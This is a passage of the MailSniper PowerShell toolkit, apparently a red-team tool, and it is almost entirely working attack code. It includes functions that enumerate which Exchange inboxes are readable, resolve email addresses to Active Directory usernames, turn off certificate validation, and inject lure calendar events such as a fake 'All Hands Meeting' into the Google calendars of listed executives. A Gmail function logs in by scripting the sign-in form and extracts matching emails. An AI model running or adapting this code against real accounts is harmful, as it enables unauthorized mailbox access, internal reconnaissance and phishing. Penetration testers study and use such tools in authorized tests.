    ("[*] Autodiscovering email server for " + $Mailbox + "...")
    $service.AutoDiscoverUrl($Mailbox, {$true})
  }    
    
    try
    {  
    $FolderRootConnect = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,'MsgFolderRoot') 
    }
    catch
    {
    Write-Output "[*] Login appears to have failed. Try the -Remote flag and enter valid credentials when prompted."
    break
    }
    
    $curr_mbx = 0
    $count = $Mailboxes.count
    $OpenMailboxes = @()
    Write-Output "`n`r"
    #First we will check to see if there are any public folders available
    Write-Output "[*] Checking for any public folders..."
    Write-Output "`n`r"
    #$publicfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::PublicFoldersRoot,$mbx)
    $PublicPropSet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
    $PublicPropSet.Add([Microsoft.Exchange.WebServices.Data.FolderSchema]::Permissions)
    #adding property set to get Public Folder Path
    $PR_Folder_Path = new-object Microsoft.Exchange.WebServices.Data.ExtendedPropertyDefinition(26293, [Microsoft.Exchange.WebServices.Data.MapiPropertyType]::String);    
    $PublicPropSet.Add($PR_Folder_Path)  

    

    $PublicFolders = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,'PublicFoldersRoot',$PublicPropSet) 

    $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100


    $PublicFolders.Load()
    $CustomFolderObj = $PublicFolders.FindFolders($folderView) 
    
    $foldercollection = @()
    $publicfolders = @()
    Foreach($foldername in $CustomFolderObj.Folders)
    {

        Write-Output ("Found public folder: " + $foldername.DisplayName)

           
                #Code that needs some modification to get the Folder Path for use when binding to the folder
                                
                #$foldpathval = $null    
                #$folderCollection += $ffFolder  
                #Try to get the FolderPath Value and then covert it to a usable String 
                  
                #if ($foldername.TryGetProperty($PR_Folder_Path,[ref] $foldpathval))    
                #{    
                #    $foldpathval
                #    $binary = [Text.Encoding]::UTF8.GetBytes($foldpathval)    
                #    $hexArr = $binary | ForEach-Object { $_.ToString("X2") }    
                #    $hexString = $hexArr -join ''    
                #    $hexString = $hexString.Replace("FEFF", "5C00")    
                #    $fpath = ConvertToString($hexString)    
               #}    
               # "FolderPath : " + $fpath    
               #if($foldername.ChildFolderCount -gt 0){  
               #     $Childfolders = GetPublicFolders -RootFolderId $foldername.Id  
               #     foreach($Childfolder in $Childfolders){  
               #         $folderCollection += $Childfolder  
               #     }  
               # }  
              


    }
    $publicfolders
    Write-Output "`n`r"
    Write-Output "[*] Checking access to mailboxes for each email address..."
    Write-Output "`n`r"
    foreach($mbx in $Mailboxes)
    {
        
        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r" 
        $curr_mbx += 1
        $Inbox = ""
        $msgfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$mbx)
        $PropSet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
        $PropSet.Add([Microsoft.Exchange.WebServices.Data.FolderSchema]::Permissions)
        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$msgfolderroot,$PropSet)
        $ItemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)

        try
        {
            
            $Item = $service.FindItems($Inbox.Id,$ItemView)  
            Write-Output "[*] SUCCESS! Inbox of $mbx is readable."
            $permissions = $Inbox.Permissions
            if ($AllPerms)
            {
                Write-Output "All Permission Settings for Inbox of $mbx"
                $permissions
            }
            else
            {
                foreach ($x in $permissions)
                {
                    if ($x.UserId.StandardUser -ne $null)
                    {
                        Write-Output ("Permission level for " + $x.UserId.StandardUser + " set to: " + $x.PermissionLevel)
                    }
                    else
                    {
                        Write-Output ("Permission level for " + $x.UserId.DisplayName + " set to: " + $x.PermissionLevel)
                  
                    }
                }
            }
            Write-Output ("Subject of latest email in inbox: " + $Item.Subject)
            
            
            $OpenMailboxes += $mbx
        }
        catch
      {
        $ErrorMessage = $_.Exception.Message
        continue
        
      }


    }

    if ($OutFile -ne "")
    {
      $OpenMailboxes | Out-File -Encoding ascii $OutFile
    }

}

function Get-ADUsernameFromEWS{

<#
  .SYNOPSIS

    This module will connect to a Microsoft Exchange server using Exchange Web Services and use a mailbox to get user contact information.

    MailSniper Function: Get-ADUsernameFromEWS
    Author: Ralph May (@ralphte01) and Beau Bullock (@dafthack)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to a Microsoft Exchange server using Exchange Web Services and use a mailbox to get user contact information.

  .PARAMETER ExchHostname

    The hostname of the Exchange server to connect to.
 
  .PARAMETER ExchangeVersion

    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
  
  .PARAMETER OutFile

    Outputs the results of the search to a file.

  .PARAMETER Remote

  Will prompt for credentials for use with connecting to a remote server such as Office365 or an externally facing Exchange server.

  .PARAMETER EmailAddress

  A single Email Addess of the contact you would like the username of.

  .PARAMETER EmailList

  List of email addresses one per line to get usernames of.

   .PARAMETER Partial

  Will Search for Partial contact matches.

  .PARAMETER AliasOnly

  Will only show the user Alias which is the active directory username.
  

  .EXAMPLE

    C:\PS> Get-ADUsernameFromEWS -EmailList email-list.txt

    Description
    -----------
    This command will attempt to get the Active Directory usernames from EWS.

  .EXAMPLE

    C:\PS> Get-ADUsernameFromEWS -Mailbox email-list.txt -ExchHostname outlook.office365.com -Remote

    Description
    -----------
    This command will prompt for credentials and then connect to Exchange Web Services on outlook.office365.com to check each email address in the email-list.txt for their associated usernames. 

#>
  Param(

    [Parameter(Position = 0, Mandatory = $False)]
    [system.URI]
    $ExchHostname = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [string]
    $OutFile = "",

    [Parameter(Position = 2, Mandatory = $False)]
    [string]
    $ExchangeVersion = "Exchange2010_SP2",

    [Parameter(Position = 3, Mandatory = $False)]
    [string]
    $EmailList = "",

    [Parameter(Position = 4, Mandatory = $False)]
    [switch]
    $Remote,

    [Parameter(Position=5, Mandatory=$false)] 
    [string]
    $EmailAddress,

    [Parameter(Position=6, Mandatory=$False)]
    [switch]
    $Partial,

    [Parameter(Position=7, Mandatory=$False)]
    [switch]
    $AliasOnly

  )
  
  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
  LoadEWSDLL
  
  $ErrorActionPreference = 'silentlycontinue'

  if (($EmailList -eq "") -and ($EmailAddress -eq ""))
    {
    Write-Output "[*] Either an EmailList or a single EmailAddress must be specified."
    break
    }

  If ($EmailList -ne "") 
  {
    $Emails = Get-Content -Path $EmailList
    $EmailAddress = $Emails[0]
  } 
  elseif ($Emails -ne "")
  {
    $Emails = $EmailAddress
  }

  Write-Output "[*] Trying Exchange version $ExchangeVersion"
  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
 
  #If the -Remote flag was passed prompt for the user's domain credentials.
  if ($Remote)
  {
    $remotecred = Get-Credential
    $service.UseDefaultCredentials = $false
    $service.Credentials = $remotecred.GetNetworkCredential()
  }
  else
  {
    #Using current user's credentials to connect to EWS
    $service.UseDefaultCredentials = $true
  }

  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
  ## Code From http://poshcode.org/624

  ## Create a compilation environment
  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
  $Compiler=$Provider.CreateCompiler()
  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
  $Params.GenerateExecutable=$False
  $Params.GenerateInMemory=$True
  $Params.IncludeDebugInformation=$False
  $Params.ReferencedAssemblies.Add("System.DLL") > $null

  $TASource=@'
    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
      public class TrustAll : System.Net.ICertificatePolicy {
        public TrustAll() { 
        }
        public bool CheckValidationResult(System.Net.ServicePoint sp,
          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
          System.Net.WebRequest req, int problem) {
          return true;
        }
      }
    }
'@ 
  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
  $TAAssembly=$TAResults.CompiledAssembly

  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll

  ## end code from http://poshcode.org/624

  
  if ($ExchHostname -ne "")
  {
    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
  }
  else
  {
    ("[*] Autodiscovering email server for " + $EmailAddress + "...")
    $service.AutoDiscoverUrl($EmailAddress, {$true})
  }    
    
    $curr_email = 0
    $count = $Emails.count
    
    Write-Output "`n`r"
    Write-Output "[*] Getting AD usernames for each email address..."
    Write-Output "`n`r"

    $allusernames = @()

    foreach($EmailAddress in $Emails)
    { 
        $folderid= new-object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Contacts,$EmailAddress)   

	    $Error.Clear();
	    $cnpsPropset= new-object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties) 
	    $ncCol = $service.ResolveName($EmailAddress,$ParentFolderIds,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryOnly,$true,$cnpsPropset);
	    if($Error.Count -eq 0)
        {
		    foreach($Result in $ncCol)
            {	
                if(($Result.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent -bor $AliasOnly.IsPresent )
                {
                    $Alias = $ncCol.Contact.Alias
				    Write-Output (("[*] $EmailAddress = ") + ("$Alias "))  
                    $allusernames += $Alias
                }

		        elseif(($Result.Mailbox.Address.ToLower() -eq $EmailAddress.ToLower()) -bor $Partial.IsPresent)
                {
				    Write-Output $ncCol.Contact
			    }
			    else
                {
				    Write-host -ForegroundColor Yellow ("Partial Match found but not returned because Primary Email Address doesn't match consider using -Partial " + $ncCol.Contact.DisplayName + " : Subject-" + $ncCol.Contact.Subject + " : Email-" + $Result.Mailbox.Address)
			    }
		    }
        }
        $curr_email += 1	
        Write-Host -NoNewline "$curr_email of $count users tested `r"	
	}
   if ($OutFile -ne "")
   {
   $allusernames | Out-File -Encoding ascii $OutFile
   }
}

Function Invoke-InjectGEventAPI{

<#

  .SYNOPSIS

    This module will connect to Google's API using an access token and inject a calendar event into a target's calendar.

    MailSniper Function: Invoke-InjectGEventAPI
    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to Google's API using an access token and inject a calendar event into a target's calendar.
    
    Steps to get a Google API Access Token needed for connecting to the API
    A. Login to Google
    B. Go to https://console.developers.google.com/flows/enableapi?apiid=calendar&pli=1
    C. Create/select a Project and agree to ToS and continue
    D. Click "Go to Credentials"
    E. On the "Add credentials to your project" page click cancel
    F. At the top of the page, select the "OAuth consent screen" tab. Select an Email address, enter a Product name if not already set, and click the Save button.
    G. Select the Credentials tab, click the Create credentials button and select OAuth client ID.
    H. Select the application type Web application, under "Authorized redirect URIs" paste in the following address: https://developers.google.com/oauthplayground". Then, click the Create button.
    I. Copy your "Client ID" and "Client Secret"
    J. Navigate here: https://developers.google.com/oauthplayground/
    K. Click the "gear icon" in the upper right corner and check the box to "Use your own OAuth credentials". Enter the OAuth2 client ID and OAuth2 client secret in the boxes.
    L. Make sure that "OAuth flow" is set to Server-side, and "Access Type" is set to offline.
    M. Select the "Calendar API v3" dropdown and click both URLs to add them to scope. Click Authorize APIs
    O. Select the account you want to authorize, then click Allow. (If there is an error such as "Error: redirect_uri_mismatch" then it's possible the changes haven't propagated yet. Just wait a few minutes, hit the back button and try to authorize again.)
    P. You should now be at "Step 2: Exchange authorization code for tokens." Click the "Exchange authorization code for tokens button". The "Access token" is item we need for accessing the API. Copy the value of the "Access token."


  .PARAMETER PrimaryEmail  
        
        Email address of the Google account you are doing the injection as. (Attacker email address)     

  .PARAMETER AccessToken      

        Google API Access Token. See the steps above to generate one of these.
        
  .PARAMETER EventTitle

        Title of the Google event.

  .PARAMETER Targets 

        Comma-seperated list of email addresses to inject the event into.

  .PARAMETER EventLocation

        Location field for the event.

  .PARAMETER EventDescription

        Description field for the event.

  .PARAMETER StartDateTime  
  
        Start date and time for the event in the format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:00:00 for October 22, 2017 at 6:00:00 PM

  .PARAMETER EndDateTime 

        End date and time for the event in the format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:30:00 for October 22, 2017 at 6:30:00 PM
  
  .PARAMETER TimeZone  
  
        Time zone for the event in the format "America/New_York"

  .PARAMETER allowModify 
  
        If set to true allows targets to modify the calendar entry

  .PARAMETER allowInvitesOther  
  
        If set to true allows targets to invite others to the calendar entry

  .PARAMETER showInvitees 
  
        If set to true will show all guests added to the event
     
  .PARAMETER ResponseStatus 
  
        "accepted"  #Can be "needsAction", "declined", "tentative", or "accepted"


    .EXAMPLE
    PS C:\> Invoke-InjectGEventAPI -PrimaryEmail your-api-email-address@gmail.com -AccessToken 'Insert your access token here' -Targets "CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com" -StartDateTime 2017-10-22T17:20:00 -EndDateTime 2017-10-22T17:30:00 -EventTitle "All Hands Meeting" -EventDescription "Please review the agenda at the URL below prior to the meeting." -EventLocation "Interwebz"


#>
    Param
    (
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $PrimaryEmail = "",       

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $AccessToken = "",        
        
        [Parameter(Position = 2, Mandatory = $false)]
        [string]
        $EventTitle = "",

        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $Targets = "", 

        [Parameter(Position = 4, Mandatory = $false)]
        [string]
        $EventLocation = "",

        [Parameter(Position = 5, Mandatory = $false)]
        [string]
        $EventDescription = "",

        [Parameter(Position = 6, Mandatory = $true)]
        [string]
        $StartDateTime = "", #format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:00:00 for October 22, 2017 at 6:00:00 PM

        [Parameter(Position = 7, Mandatory = $true)]
        [string]
        $EndDateTime = "",   #format of YYYY-MM-DDTHH:MM:SS like this: 2017-10-22T18:30:00 for October 22, 2017 at 6:30:00 PM

        [Parameter(Position = 8, Mandatory = $false)]
        [string]
        $TimeZone = "America/New_York",

        [Parameter(Position = 9, Mandatory = $false)]
        [string]
        $allowModify = "false", #if set to true allows targets to modify the calendar entry

        [Parameter(Position = 10, Mandatory = $false)]
        [string]
        $allowInvitesOther = "true", #if set to true allows targets to invite others to the calendar entry

        [Parameter(Position = 11, Mandatory = $false)]
        [string]
        $showInvitees = "false",  #if set to true will show all guests added to the event
     
        [Parameter(Position = 12, Mandatory = $false)]
        [string]
        $ResponseStatus = "accepted"  #Can be "needsAction", "declined", "tentative", or "accepted"

    )

        #Crafting the JSON body

        $targetsarray = $targets -split ","
        foreach($target in $targetsarray)
        {
            $GEventBody = @{
                kind = "calendar#event";
                start = @{ dateTime = "$StartDateTime"; timeZone = "$TimeZone"};
                end = @{ dateTime = "$EndDateTime"; timeZone = "$TimeZone"};
                summary = "$EventTitle";
                description = "$EventDescription";
                location = "$EventLocation";
                attendees = @(
                    @{email= "$Target"; responseStatus = "$ResponseStatus"}
                    );
                guestsCanInviteOthers = "$allowInvitesOther";
                guestsCanSeeOtherGuests = "$showInvitees";
                guestsCanModify = "$allowModify"

            }

            $GEventHeaders = @{'Accept'='*/*';'Content-Type'='application/json';'Authorization'= "Bearer $AccessToken"}

            #Injecting event into calendar
            Write-Output "[*] Now injecting event into target calendar(s): $Target"
            $CalendarInjection = Invoke-RestMethod -Uri "https://www.googleapis.com/calendar/v3/calendars/$PrimaryEmail/events" -Method POST -Headers $GEventHeaders -Body (ConvertTo-Json $GEventBody)
        }
}

Function Invoke-InjectGEvent{

<#
.SYNOPSIS

    This module will connect to Google using a set of user credentials and inject a calendar event into a target's calendar.

    MailSniper Function: Invoke-InjectGEvent
    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to Google using a set of user credentials and inject a calendar event into a target's calendar.
   
  .PARAMETER EmailAddress  
        
        Email address of the Google account you are doing the injection as. (Attacker email address)     

  .PARAMETER Password      

        Password for the account to auth to Google.
        
  .PARAMETER EventTitle

        Title of the Google event.

  .PARAMETER Targets 

        Comma-seperated list of email addresses to inject the event into.

  .PARAMETER EventLocation

        Location field for the event.

  .PARAMETER EventDescription

        Description field for the event.

  .PARAMETER StartDateTime  
  
        Start date and time for the event in the format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM

  .PARAMETER EndDateTime 

        End date and time for the event in the format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM
  
  .PARAMETER TimeZone  
  
        Time zone for the event in the format "America/New_York"

  .PARAMETER allowModify 
  
        If set to true allows targets to modify the calendar entry

  .PARAMETER allowInvitesOther  
  
        If set to true allows targets to invite others to the calendar entry

  .PARAMETER showInvitees 
  
        If set to true will show all guests added to the event
     

    .EXAMPLE
    PS C:\> Invoke-InjectGEvent -EmailAddress your-google-email-address@gmail.com -Password 'Password for the Google Account' -Targets "CEOofEvilCorp@gmail.com,CTOofEvilCorp@gmail.com,CFOofEvilCorp.com" -StartDateTime 20171022T172000 -EndDateTime 20171022T173000 -EventTitle "All Hands Meeting" -EventDescription "Please review the agenda at the URL below prior to the meeting." -EventLocation "Interwebz"


#>


    Param
    (
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $EmailAddress = "",

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password = "",

        [Parameter(Position = 2, Mandatory = $false)]
        [string]
        $EventTitle = "",

        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $Targets = "",

        [Parameter(Position = 4, Mandatory = $false)]
        [string]
        $EventLocation = "",

        [Parameter(Position = 5, Mandatory = $false)]
        [string]
        $EventDescription = "",

        [Parameter(Position = 6, Mandatory = $true)]
        [string]
        $StartDateTime = "", #format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM

        [Parameter(Position = 7, Mandatory = $true)]
        [string]
        $EndDateTime = "",   #format of YYYYMMDDTHHMMSS like this: 20171010T213000 for October 10, 2017 at 9:30:00 PM

        [Parameter(Position = 8, Mandatory = $false)]
        [string]
        $TimeZone = "America/New_York",

        [Parameter(Position = 9, Mandatory = $false)]
        [string]
        $allowModify = "false", #if set to true allows targets to modify the calendar entry

        [Parameter(Position = 10, Mandatory = $false)]
        [string]
        $allowInvitesOther = "true", #if set to true allows targets to invite others to the calendar entry

        [Parameter(Position = 11, Mandatory = $false)]
        [string]
        $showInvitees = "false",  #if set to true will show all guests added to the event

        [Parameter(Position = 12, Mandatory = $false)]
        [string]
        $userStatus = "false",  

        [Parameter(Position = 13, Mandatory = $false)]
        [string]
        $createdBySet = "false"  

    )

        #Start a new Google session and input the email address of the user who will be creating the event
        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        $EmailForm = $SessionRequest.Forms[0]
        $EmailForm.Fields["Email"]= $EmailAddress
        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)

        #Submit the authentication for the user and maintain a valid session in $googlesession
        $PasswordForm = $EmailSubmitRequest.Forms[0]
        $PasswordForm.Fields["Email"]= $EmailAddress
        $PasswordForm.Fields["Passwd"]= $Password
        Write-Output "[*] Now logging into account with provided credentials"
        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
        foreach ($cookie in $cookies)
        {
            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
            {
                $PrimarySIDExists = $true
            }
        }
        if ($PrimarySIDExists)
        {
            Write-Output "[*] Authentication appears to be successful"
        }
        else
        {
            Write-Output "[*] Authentication appears to have failed. Check the credentials."       
            break
        }

        #Navigate to the Google Calendar and obtain the 'secid' that is necessary for POSTing events
        Write-Output "[*] Obtaining 'secid' for POSTing to calendar"
        $CalendarLoad = Invoke-WebRequest -Uri ("https://calendar.google.com/calendar/render") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
        #$secidline = $CalendarLoad.tostring() -split "[`r`n]" | select-string 'null,null,null,0]'
        $CalendarLoad.tostring() -match "(?<=window\['INITIAL_DATA'\]\ =\ )(?s).*(?=\n;)" | out-null
        $json = ConvertFrom-Json $Matches[0]
        $secid = $json[26]

        #$GEventParams = @{'sf'='true';'output'='js';'action'='CREATE';'useproto'='true';'add'=$Targets;'crm'='BUSY';'icc'='DEFAULT';'sprop'='goo.allowModify:false';'pprop'='eventColor:none';'text'=$EventTitle;'location'=$EventLocation;'details'=$EventDescription;'src'='';'dates'=($StartDateTime + "/" + $EndDateTime);'unbounded'='false';'scp'='ONE';'hl'='en';'stz'=$TimeZone;'secid'=$secid}
        $Dates = ($StartDateTime + "/" + $EndDateTime)
        $GEventHeaders = @{'Accept'='*/*';'X-If-No-Redirect'='1';'X-Is-Xhr-Request'='1';'Content-Type'='application/x-www-form-urlencoded;charset=utf-8';'Referer'='https://calendar.google.com/calendar/render?pli=1';'Accept-Language'='en-US';'Accept-Encoding'='gzip; deflate';'User-Agent'='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv=11.0) like Gecko';'Host'='calendar.google.com';'Cache-Control'='no-cache'}
        $GEventParams = "text=$EventTitle&output=js&useproto=true&hl=en&dates=$Dates&location=$EventLocation&pprop=eventColor%3Anone&add=$Targets&status=1&crm=BUSY&icc=DEFAULT&scp=ONE&action=CREATE&details=$EventDescription&sprop=goo.allowModify%3A$allowModify&sprop=goo.allowInvitesOther:$AllowInvitesOther&sprop=goo.showInvitees:$ShowInvitees&sprop=goo.userStatus:$userStatus&sprop=goo.createdBySet:$createdBySet&stz=$TimeZone&secid=$secid&sf=true&src=&unbounded=false"

        #Injecting event into calendar
        Write-Output "[*] Now injecting event into target calendar(s): $Targets"
        $CalendarInjection = Invoke-WebRequest -Uri "https://calendar.google.com/calendar/event" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body $GEventParams

        $EventCreationResponse = $CalendarInjection.RawContent -split '\\"'
        $EventID = $EventCreationResponse[1]

        #Entry verification
        $CheckingEventExists = Invoke-WebRequest -Uri "https://calendar.google.com/calendar/event" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body "eid=$EventID&sf=true&secid=$secid"
        [xml]$EventXmlOutput = $CheckingEventExists.Content
        
        if($EventXmlOutput.eventpage.eid.value -ne $EventID)
        {
            Write-Output "`nLooks like something may have gone wrong. Maybe login to G-Calendar directly and check to see if the event was created."
        }
        else
        {
            Write-Output "`n[*] Success! The details for the event are below`n"
            $confirmedeid = $EventXmlOutput.eventpage.eid.value
            $confirmedtitle = $EventXmlOutput.eventpage.summary.value
            $confirmedlocation = $EventXmlOutput.eventpage.location.value
            $confirmeddescription = $EventXmlOutput.eventpage.description.value
            $confirmeddates = $EventXmlOutput.eventpage.dates.display
            $confirmedtimezone = $EventXmlOutput.eventpage.timezone.value
            $attendeelist = $EventXmlOutput.eventpage.attendees.attendee.principal.display
            $eventcreator = $EventXmlOutput.eventpage.creator.principal.value

            Write-Output "[+] Title : $confirmedtitle"
            Write-Output "[+] Location : $confirmedlocation"
            Write-Output "[+] Description : $confirmeddescription"
            Write-Output "[+] Dates : $confirmeddates"
            Write-Output "[+] Timezone : $confirmedtimezone"
            Write-Output "[+] Attendees : $attendeelist"
            Write-Output "[+] Creator : $eventcreator"
            Write-Output "[+] EventID : $confirmedeid"
        }
}

Function Invoke-SearchGmail{
<#
    .SYNOPSIS

    This module will connect to Google using a set of user credentials and search a user's inbox for certain terms.

    MailSniper Function: Invoke-SearchGmail
    Author: Beau Bullock (@dafthack) & Michael Felch (@ustayready)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

  .DESCRIPTION

    This module will connect to Google using a set of user credentials and search a user's inbox for certain terms.

        .EXAMPLE
        
            PS C:> Invoke-SearchGmail -EmailAddress email@gmail.com -Password Summer2017 -Search search-term -OutputCsv out.csv
#>


    Param
    (

        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $EmailAddress = "",

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password = "",

        [Parameter(Position = 2, Mandatory = $true)]
        [string]
        $Search = "",

        [Parameter(Position = 3, Mandatory = $true)]
        [string]
        $OutputCsv = ""
    )

        #Start a new Google session and input the email address of the user who will be creating the event
        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        $EmailForm = $SessionRequest.Forms[0]
        $EmailForm.Fields["Email"]= $EmailAddress
        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)

        #Submit the authentication for the user and maintain a valid session in $googlesession
        $PasswordForm = $EmailSubmitRequest.Forms[0]
        $PasswordForm.Fields["Email"]= $EmailAddress
        $PasswordForm.Fields["Passwd"]= $Password
        Write-Output "[*] Now logging into account with provided credentials"
        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
        foreach ($cookie in $cookies)
        {
            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
            {
                $PrimarySIDExists = $true
            }
        }
        if ($PrimarySIDExists)
        {
            Write-Output "[*] Authentication appears to be successful"
        }
        else
        {
            Write-Output "[*] Authentication appears to have failed. Check the credentials."
            break
        }

        #Get ik param needed in search
        Write-Output "[*] Now searching Gmail account $EmailAddress for: $Search"
        $GetIKParam = 's_jr=[null,[[null,null,null,null,null,null,[null,true,false]],[null,[null,"test",0,null,30,null,null,null,false,[],[]]]],2,null,null,null,""]'
        $GetGmailSession = Invoke-WebRequest -Uri "https://mail.google.com/mail" -WebSession $googlesession
        $GetIKRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $GetIKParam
        $GetIKRequest.Content -match @'
(?<=user key\ ')[A-Za-z0-9]*(?='\")
'@ | Out-null
        $ik = $Matches[0]
        $SettingsLoad = Invoke-WebRequest -Uri ("https://mail.google.com/mail/u/0/#settings/filters") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
           
        $SettingsLoad.tostring() -match '(?<=GM_ACTION_TOKEN=\").*(?=\";var)' | out-null
        $at = $Matches[0]
        
        $SearchRequest = Invoke-WebRequest -WebSession $googlesession -Method Post -Uri "https://mail.google.com/mail/u/0/?ui=2&ik=$ik&at=$at&view=tl&start=0&num=1000&mb=0&rt=c&q=$search&search=query"

        $SearchResultsJson = $SearchRequest.Content -split "\n"
        $SearchJson = $SearchResultsJson[3]
        $MainResultsJson = $SearchResultsJson[5]

        $json1 = $SearchJson | ConvertFrom-Json
        $finaljson = $MainResultsJson | ConvertFrom-Json

        [int]$totalresults = $json1[5][2]
        
        Write-Output "[*] $totalresults emails found that match the search term $search."

        Write-Output "[*] Getting email ids"
        $i = 0
        $emailids = @()
        while ($i -lt $totalresults)
        {
            $emailids += $finaljson[0][2][$i][0]
            $i++
        }

        $fullresultsarray = @()
       

        $count = 1
        foreach ($eid in $emailids)
        {
            Write-Output "[*] Now checking email $count of $totalresults."
            $EmailParam = "s_jr=[null,[[null,null,[null,`"$eid`",`"*`",false,true,true,null,null,null,null,null]]],2,null,null,null,`"$ik`"]"
            $EmailRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $EmailParam

            $EmailJson = $EmailRequest.Content -split "&\["
            $EmailJson = "[" + $EmailJson[1]
            $emailfinaljson = $EmailJson | ConvertFrom-Json
            $MailSubject = $emailfinaljson[1][0][3][1][5][0][5]
            $MailSender = $emailfinaljson[1][0][3][1][5][0][7]
            $MailReceiver = $emailfinaljson[1][0][3][1][5][0][8][0][1]
            $MailBody = $emailfinaljson[1][0][3][1][5][0][3][0][2]

